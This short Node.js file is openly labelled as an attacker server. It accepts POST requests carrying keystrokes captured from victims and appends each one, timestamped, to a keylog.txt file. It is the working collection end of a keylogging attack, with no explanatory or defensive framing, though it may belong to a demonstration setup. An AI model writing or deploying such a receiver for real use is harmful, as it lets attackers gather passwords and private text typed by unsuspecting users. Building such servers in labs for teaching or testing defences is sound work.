// Attacker server that receives keystrokes via POST and appends to keylog.txt
// Usage: node attacker_server.js

const http = require('http');
const fs = require('fs');

const PORT = process.env.ATTACKER_PORT || 9000;

const server = http.createServer((req, res) => {
  if (req.method !== 'POST') {
    res.writeHead(405, { 'Content-Type': 'text/plain' });
    return res.end('Only POST allowed');
  }

  let body = '';
  req.on('data', (chunk) => {
    body += chunk.toString();
    // Avoid DOS with too much data
    if (body.length > 1e6) req.connection.destroy();
  });

  req.on('end', () => {
    const logEntry = `${new Date().toISOString()} :: ${body}\n`;
    fs.appendFileSync('keylog.txt', logEntry);
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('OK');
  });
});

server.listen(PORT, () => {
  console.log(`Attacker server listening on http://localhost:${PORT}`);
}); 